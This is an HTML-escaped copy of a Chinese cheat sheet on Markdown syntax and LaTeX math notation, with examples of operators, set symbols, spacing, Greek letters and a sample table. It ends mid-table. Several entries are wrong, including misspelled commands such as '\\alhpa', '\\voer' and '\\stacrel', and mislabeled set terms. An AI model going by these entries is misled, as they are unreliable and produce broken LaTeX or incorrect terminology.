&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;![Google Logo](https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png&quot; alt=&quot;Google Logo&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;链接&quot;&gt;链接&lt;/h2&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[Google](https://www.google.com/)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;a href=&quot;https://www.google.com/&quot;&gt;Google&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;分割线&quot;&gt;分割线&lt;/h2&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;***
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;hr /&gt;

&lt;h2 id=&quot;粗体斜体&quot;&gt;粗体/斜体&lt;/h2&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;**作者**
*张三*
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;作者&lt;/strong&gt;
&lt;em&gt;张三&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;代码&quot;&gt;代码&lt;/h2&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;```sh
#/bin/sh
echo &quot;hello world&quot;
```
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#/bin/sh&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;hello world&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;区块标识&quot;&gt;区块标识&lt;/h2&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;这是一个区块
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;数学公式&quot;&gt;数学公式&lt;/h2&gt;
&lt;h3 id=&quot;上标下标与组合&quot;&gt;上标、下标与组合&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;上标符号，符号：^&lt;/li&gt;
  &lt;li&gt;下标符号，符号：_&lt;/li&gt;
  &lt;li&gt;组合符号，符号：{}
&lt;script type=&quot;math/tex&quot;&gt;x^4&lt;/script&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;x_1&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;{16}_{8}O{2+}_{2}&lt;/script&gt;

&lt;h3 id=&quot;汉字字体与格式&quot;&gt;汉字、字体与格式&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;汉字形式，符号：\mbox{}&lt;/li&gt;
  &lt;li&gt;字体控制，符号：\displaystyle&lt;/li&gt;
  &lt;li&gt;下划线符号，符号：\underline&lt;/li&gt;
  &lt;li&gt;标签，符号\tag{数字}&lt;/li&gt;
  &lt;li&gt;上大括号，符号：\overbrace{算式}&lt;/li&gt;
  &lt;li&gt;下大括号，符号：\underbrace{算式}&lt;/li&gt;
  &lt;li&gt;上位符号，符号：\stacrel{上位符号}{基位符号}
&lt;script type=&quot;math/tex&quot;&gt;V_{\mbox{初始}}&lt;/script&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;\displaystyle \frac{x+y}{y+z}&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;\underline{x+y}&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;\tag{11}&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;\overbrace{a+b+c+d}^{2.0}&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;a+\underbrace{b+c}_{1.0}+d&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;\vec{x}\stackrel{\mathrm{def}}{=}{x_1,\dots,x_n}&lt;/script&gt;

&lt;h3 id=&quot;占位符&quot;&gt;占位符&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;两个quad空格，符号：\qquad&lt;/li&gt;
  &lt;li&gt;quad空格，符号：\quad&lt;/li&gt;
  &lt;li&gt;大空格，符号\&lt;/li&gt;
  &lt;li&gt;中空格，符号:&lt;/li&gt;
  &lt;li&gt;小空格，符号\,&lt;/li&gt;
  &lt;li&gt;没有空格，符号``&lt;/li&gt;
  &lt;li&gt;紧贴，符号!
&lt;script type=&quot;math/tex&quot;&gt;x \qquad y&lt;/script&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;x \quad y&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;x \ y&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;x : y&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;x , y&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;xy&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;x ! y&lt;/script&gt;

&lt;h3 id=&quot;定界符与组合&quot;&gt;定界符与组合&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;括号，符号：（）\big(\big) \Big(\Big) \bigg(\bigg) \Bigg(\Bigg)&lt;/li&gt;
  &lt;li&gt;中括号，符号：[]&lt;/li&gt;
  &lt;li&gt;大括号，符号：{ }&lt;/li&gt;
  &lt;li&gt;自适应括号，符号：\left \right&lt;/li&gt;
  &lt;li&gt;组合公式，符号：{上位公式 \choose 下位公式}&lt;/li&gt;
  &lt;li&gt;组合公式，符号：{上位公式 \atop 下位公式}
&lt;script type=&quot;math/tex&quot;&gt;（）\big(\big) \Big(\Big) \bigg(\bigg) \Bigg(\Bigg)&lt;/script&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;[x+y]&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;{x+y}&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;\left(x\right)$，$\left(x{yz}\right)&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;{n+1 \choose k}={n \choose k}+{n \choose k-1}&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;\sum_{k_0,k_1,\ldots&gt;0 \atop k_0+k_1+\cdots=n}A_{k_0}A_{k_1}\cdots&lt;/script&gt;

&lt;h3 id=&quot;四则运算&quot;&gt;四则运算&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;加法运算，符号：+&lt;/li&gt;
  &lt;li&gt;减法运算，符号：-&lt;/li&gt;
  &lt;li&gt;加减运算，符号：\pm&lt;/li&gt;
  &lt;li&gt;减甲运算，符号：\mp&lt;/li&gt;
  &lt;li&gt;乘法运算，符号：\times&lt;/li&gt;
  &lt;li&gt;点乘运算，符号：\cdot&lt;/li&gt;
  &lt;li&gt;星乘运算，符号：\ast&lt;/li&gt;
  &lt;li&gt;除法运算，符号：\div&lt;/li&gt;
  &lt;li&gt;斜法运算，符号：/&lt;/li&gt;
  &lt;li&gt;分式表示，符号：\frac{分子}{分母}&lt;/li&gt;
  &lt;li&gt;分式表示，符号：{分子} \voer {分母}&lt;/li&gt;
  &lt;li&gt;
    &lt;table&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
          &lt;td&gt;绝对值表示，符号：&lt;/td&gt;
          &lt;td&gt; &lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;
    &lt;/table&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;x+y=z&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;x-y=z&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;x \pm y=z&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;x \mp y=z&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;x \times y=z&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;x \cdot y=z&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;x \ast y=z&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;x \div y=z&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;x/y=z&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;\frac{x+y}{y+z}&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;{x+y} \over {y+z}&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;|x+y|&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;\overline{xyz}&lt;/script&gt;

&lt;h3 id=&quot;高级运算&quot;&gt;高级运算&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;平均数运算，符号：\overline{算式}&lt;/li&gt;
  &lt;li&gt;开二次方运算，符号：\sqrt&lt;/li&gt;
  &lt;li&gt;开方运算，符号：\sqrt[开方数]{被开方数}&lt;/li&gt;
  &lt;li&gt;对数运算，符号：\log&lt;/li&gt;
  &lt;li&gt;极限运算，符号：\lim&lt;/li&gt;
  &lt;li&gt;极限运算，符号：\displaystyle \lim&lt;/li&gt;
  &lt;li&gt;求和运算，符号：\sum&lt;/li&gt;
  &lt;li&gt;求和运算，符号：\displaystyle \sum&lt;/li&gt;
  &lt;li&gt;积分运算，符号：\int&lt;/li&gt;
  &lt;li&gt;积分运算，符号：\displaystyle \int&lt;/li&gt;
  &lt;li&gt;微分运算，符号：\partial&lt;/li&gt;
  &lt;li&gt;矩阵表示，符号：\begin{matrix} \end{matrix}
&lt;script type=&quot;math/tex&quot;&gt;\overline{xyz}&lt;/script&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;\sqrt x&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;\sqrt[3]{x+y}&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;\log(x)&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;\lim^{x \to \infty}_{y \to 0}{\frac{x}{y}}&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;\displaystyle \lim^{x \to \infty}_{y \to 0}{\frac{x}{y}}&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;\sum^{x \to \infty}_{y \to 0}{\frac{x}{y}}&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;\displaystyle \sum^{x \to \infty}_{y \to 0}{\frac{x}{y}}&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;\int^{\infty}_{0}{xdx}&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;\displaystyle \int^{\infty}_{0}{xdx}&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;\frac{\partial x}{\partial y}&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;% &lt;![CDATA[
\left[ \begin{matrix} 1 &amp;2 &amp;\cdots &amp;4\5 &amp;6 &amp;\cdots &amp;8\\vdots &amp;\vdots &amp;\ddots &amp;\vdots\13 &amp;14 &amp;\cdots &amp;16\end{matrix} \right] %]]&gt;&lt;/script&gt;

&lt;h3 id=&quot;逻辑运算&quot;&gt;逻辑运算&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;等于运算，符号：=&lt;/li&gt;
  &lt;li&gt;大于运算，符号：&amp;gt;&lt;/li&gt;
  &lt;li&gt;小于运算，符号：&amp;lt;&lt;/li&gt;
  &lt;li&gt;大于等于运算，符号：\geq&lt;/li&gt;
  &lt;li&gt;小于等于运算，符号：\leq&lt;/li&gt;
  &lt;li&gt;不等于运算，符号：\neq&lt;/li&gt;
  &lt;li&gt;不大于等于运算，符号：\ngeq&lt;/li&gt;
  &lt;li&gt;不大于等于运算，符号：\not\geq&lt;/li&gt;
  &lt;li&gt;不小于等于运算，符号：\nleq&lt;/li&gt;
  &lt;li&gt;不小于等于运算，符号：\not\leq&lt;/li&gt;
  &lt;li&gt;约等于运算，符号：\approx&lt;/li&gt;
  &lt;li&gt;恒定等于运算，符号：\equiv&lt;/li&gt;
&lt;/ul&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;x+y=z&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;x+y&gt;z&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;% &lt;![CDATA[
x+y&lt;z %]]&gt;&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;x+y \geq z&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;x+y \leq z&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;x+y \neq z&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;x+y \ngeq z&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;x+y \not\geq z&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;x+y \nleq z&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;x+y \not\leq z&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;x+y \approx z&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;x+y \equiv z&lt;/script&gt;

&lt;h3 id=&quot;集合运算&quot;&gt;集合运算&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;属于运算，符号：\in&lt;/li&gt;
  &lt;li&gt;不属于运算，符号：\notin&lt;/li&gt;
  &lt;li&gt;不属于运算，符号：\not\in&lt;/li&gt;
  &lt;li&gt;子集运算，符号：\subset&lt;/li&gt;
  &lt;li&gt;子集运算，符号：\supset&lt;/li&gt;
  &lt;li&gt;真子集运算，符号：\subseteq&lt;/li&gt;
  &lt;li&gt;非真子集运算，符号：\subsetneq&lt;/li&gt;
  &lt;li&gt;真子集运算，符号：\supseteq&lt;/li&gt;
  &lt;li&gt;非真子集运算，符号：\supsetneq&lt;/li&gt;
  &lt;li&gt;非子集运算，符号：\not\subset&lt;/li&gt;
  &lt;li&gt;非子集运算，符号：\not\supset&lt;/li&gt;
  &lt;li&gt;并集运算，符号：\cup&lt;/li&gt;
  &lt;li&gt;交集运算，符号：\cap&lt;/li&gt;
  &lt;li&gt;差集运算，符号：\setminus&lt;/li&gt;
  &lt;li&gt;同或运算，符号：\bigodot&lt;/li&gt;
  &lt;li&gt;同与运算，符号：\bigotimes&lt;/li&gt;
  &lt;li&gt;实数集合，符号：\mathbb{R}&lt;/li&gt;
  &lt;li&gt;自然数集合，符号：\mathbb{Z}&lt;/li&gt;
  &lt;li&gt;空集，符号：\emptyset
&lt;script type=&quot;math/tex&quot;&gt;x \in y&lt;/script&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;x \notin y&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;x \not\in y&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;x \subset y&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;x \supset y&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;x \subseteq y&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;x \subsetneq y&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;x \supseteq y&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;x \supsetneq y&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;x \not\subset y&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;x \not\supset y&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;x \cup y&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;x \cap y&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;x \setminus y&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;x \bigodot y&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;x \bigotimes y&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;\mathbb{R}&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;\mathbb{Z}&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;\emptyset&lt;/script&gt;

&lt;h3 id=&quot;数学符号&quot;&gt;数学符号&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;无穷，符号：\infty&lt;/li&gt;
  &lt;li&gt;虚数，符号：\imath&lt;/li&gt;
  &lt;li&gt;虚数，符号：\jmath&lt;/li&gt;
  &lt;li&gt;数学符号，符号\hat{a}&lt;/li&gt;
  &lt;li&gt;数学符号，符号\check{a}&lt;/li&gt;
  &lt;li&gt;数学符号，符号\breve{a}&lt;/li&gt;
  &lt;li&gt;数学符号，符号\tilde{a}&lt;/li&gt;
  &lt;li&gt;数学符号，符号\bar{a}&lt;/li&gt;
  &lt;li&gt;矢量符号，符号\vec{a}&lt;/li&gt;
  &lt;li&gt;数学符号，符号\acute{a}&lt;/li&gt;
  &lt;li&gt;数学符号，符号\grave{a}&lt;/li&gt;
  &lt;li&gt;数学符号，符号\mathring{a}&lt;/li&gt;
  &lt;li&gt;一阶导数符号，符号\dot{a}&lt;/li&gt;
  &lt;li&gt;二阶导数符号，符号\ddot{a}&lt;/li&gt;
  &lt;li&gt;上箭头，符号：\uparrow&lt;/li&gt;
  &lt;li&gt;上箭头，符号：\Uparrow&lt;/li&gt;
  &lt;li&gt;下箭头，符号：\downarrow&lt;/li&gt;
  &lt;li&gt;下箭头，符号：\Downarrow&lt;/li&gt;
  &lt;li&gt;左箭头，符号：\leftarrow&lt;/li&gt;
  &lt;li&gt;左箭头，符号：\Leftarrow&lt;/li&gt;
  &lt;li&gt;右箭头，符号：\rightarrow&lt;/li&gt;
  &lt;li&gt;右箭头，符号：\Rightarrow&lt;/li&gt;
  &lt;li&gt;底端对齐的省略号，符号：\ldots&lt;/li&gt;
  &lt;li&gt;中线对齐的省略号，符号：\cdots&lt;/li&gt;
  &lt;li&gt;竖直对齐的省略号，符号：\vdots&lt;/li&gt;
  &lt;li&gt;斜对齐的省略号，符号：\ddots
&lt;script type=&quot;math/tex&quot;&gt;\infty&lt;/script&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;\imath&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;\jmath&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;\hat{a}&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;\check{a}&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;\breve{a}&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;\tilde{a}&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;\bar{a}&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;\vec{a}&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;\acute{a}&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;\grave{a}&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;\mathring{a}&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;\dot{a}&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;\ddot{a}&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;\uparrow&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;\Uparrow&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;\downarrow&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;\Downarrow&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;\leftarrow&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;\Leftarrow&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;\rightarrow&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;\Rightarrow&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;1,2,\ldots,n&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;x_1^2 + x_2^2 + \cdots + x_n^2&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;\vdots&lt;/script&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;\ddots&lt;/script&gt;

&lt;h3 id=&quot;希腊字母&quot;&gt;希腊字母&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;字母&lt;/th&gt;
      &lt;th&gt;实现&lt;/th&gt;
      &lt;th&gt;字母&lt;/th&gt;
      &lt;th&gt;实现&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;A&lt;/td&gt;
      &lt;td&gt;A&lt;/td&gt;
      &lt;td&gt;α&lt;/td&gt;
      &lt;td&gt;\alhpa&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;B&lt;/td&gt;
      &lt;td&gt;B&lt;/td&gt;
      &lt;td&gt;β&lt;/td&gt;
      &lt;td&gt;\beta&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Γ&lt;/td&gt;
      &lt;td&gt;\Gamma&lt;/td&gt;
      &lt;td&gt;γ&lt;/td&gt;
      &lt;td&gt;\gamma&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Δ&lt;/td&gt;
      &lt;td&gt;\Delta&lt;/td&gt;
      &lt;td&gt;δ&lt;/td&gt;
      &lt;td&gt;\delta&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;E&lt;/td&gt;
      &lt;td&gt;E&lt;/td&gt;
      &lt;td&gt;ϵ&lt;/td&gt;
      &lt;td&gt;\epsilon&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Z&lt;/td&gt;
      &lt;td&gt;Z&lt;/td&gt;
      &lt;td&gt;ζ&lt;/td&gt;
      &lt;td&gt;\zeta&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;H&lt;/td&gt;
      &lt;td&gt;H&lt;/td&gt;
      &lt;td&gt;η&lt;/td&gt;
      &lt;td&gt;\eta&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Θ&lt;/td&gt;
      &lt;td&gt;\Theta&lt;/td&gt;
      &lt;td&gt;θ&lt;/td&gt;
      &lt;td&gt;\theta&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;I&lt;/td&gt;
      &lt;td&gt;I&lt;/td&gt;
      &lt;td&gt;ι&lt;/td&gt;
      &lt;td&gt;\iota&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;K&lt;/td&gt;
      &lt;td&gt;K&lt;/td&gt;
      &lt;td&gt;κ&lt;/td&gt;
      &lt;td&gt;\kappa&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Λ&lt;/td&gt;
      &lt;td&gt;\Lambda&lt;/td&gt;
      &lt;td&gt;λ&lt;/td&gt;
      &lt;td&gt;\lambda&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;M&lt;/td&gt;
      &lt;td&gt;M&lt;/td&gt;
      &lt;td&gt;μ&lt;/td&gt;
      &lt;td&gt;\mu&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;N&lt;/td&gt;
      &lt;td&gt;N&lt;/td&gt;
      &lt;td&gt;ν&lt;/td&gt;
      &lt;td&gt;\nu&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Ξ&lt;/td&gt;
      &lt;td&gt;\Xi&lt;/td&gt;
      &lt;td&gt;ξ&lt;/td&gt;
      &lt;td&gt;\xi&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;O&lt;/td&gt;
      &lt;td&gt;O&lt;/td&gt;
      &lt;td&gt;ο&lt;/td&gt;
      &lt;td&gt;\omicron&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Π&lt;/td&gt;
      &lt;td&gt;\Pi&lt;/td&gt;
      &lt;td&gt;π&lt;/td&gt;
      &lt;td&gt;\pi&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;P&lt;/td&gt;
      &lt;td&gt;P&lt;/td&gt;
      &lt;td&gt;ρ&lt;/td&gt;
      &lt;td&gt;\rho&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Σ&lt;/td&gt;
      &lt;td&gt;\Sigma&lt;/td&gt;
      &lt;td&gt;σ&lt;/td&gt;
      &lt;td&gt;\sigma&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;T&lt;/td&gt;
      &lt;td&gt;T&lt;/td&gt;
      &lt;td&gt;τ&lt;/td&gt;
      &lt;td&gt;\tau&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Υ&lt;/td&gt;
      &lt;td&gt;\Upsilon&lt;/td&gt;
      &lt;td&gt;υ&lt;/td&gt;
      &lt;td&gt;\upsilon&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Φ&lt;/td&gt;
      &lt;td&gt;\Phi&lt;/td&gt;
      &lt;td&gt;ϕ&lt;/td&gt;
      &lt;td&gt;\phi&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;X&lt;/td&gt;
      &lt;td&gt;X&lt;/td&gt;
      &lt;td&gt;χ&lt;/td&gt;
      &lt;td&gt;\chi&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Ψ&lt;/td&gt;
      &lt;td&gt;\Psi&lt;/td&gt;
      &lt;td&gt;ψ&lt;/td&gt;
      &lt;td&gt;\psi&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Ω&lt;/td&gt;
      &lt;td&gt;\v&lt;/td&gt;
      &lt;td&gt;ω&lt;/td&gt;
      &lt;td&gt;\omega&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;表格&quot;&gt;表格&lt;/h2&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;姓名&lt;/th&gt;
      &lt;th&gt;性别&lt;/th&gt;
      &lt;th&gt;毕业学校&lt;/th&gt;
      &lt;th&gt;工资&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;张三&lt;/td&gt;
      &lt;td&gt;男&lt;/td&gt;
      &lt;td&gt;重庆交通大学&lt;/td&gt;
      &lt;td&gt;3200&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;李四&lt;/td&gt;
      &lt;td&gt;男&lt;/td&gt;
      &lt;td&gt;贵州大学&lt;/td&gt;
      &lt;td&gt;5000&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;王五&lt;/td&gt;
      &lt;td&gt;女&lt;/td&gt;
      &lt;td&gt;北京大学&lt;/td&gt;
      &lt;td&gt;2000&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;name&lt;/th&gt;
      &lt;th&gt;description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;:---&lt;/td&gt;
      &lt;td&gt;左对齐&lt;/td&gt;
